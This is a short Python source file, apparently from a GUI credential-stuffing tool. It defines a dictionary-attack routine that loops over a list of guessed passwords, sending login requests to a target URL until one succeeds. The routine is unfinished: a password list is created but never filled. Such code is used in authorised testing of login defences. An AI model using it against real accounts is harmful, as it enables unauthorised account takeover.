import requests

from global_functions import send_request
from gui.credential_stuffing.console_view import ConsoleView
from gui.credential_stuffing.stopped_manager import is_stopped


def dictionary_attack(username_var, username_value, password_var,
                      login_success_var, url, headers,
                      info_list,
                      estimated_password_length,
                      string_cutoff_length,
                      console_view: ConsoleView):

    # Trying info_list as passwords
    try_passwords(username_var, username_value, password_var,
                  login_success_var, url, headers,
                  info_list,
                  console_view)

    # Creating passwords from info_list
    password_list = []


def try_passwords(username_var, username_value, password_var,
                  login_success_var, url, headers,
                  password_list,
                  console_view: ConsoleView):
    for password in password_list:
        if is_stopped():
            break

        if send_request(username_var, username_value, password_var, password,
                     login_success_var, url, headers, console_view):
            return True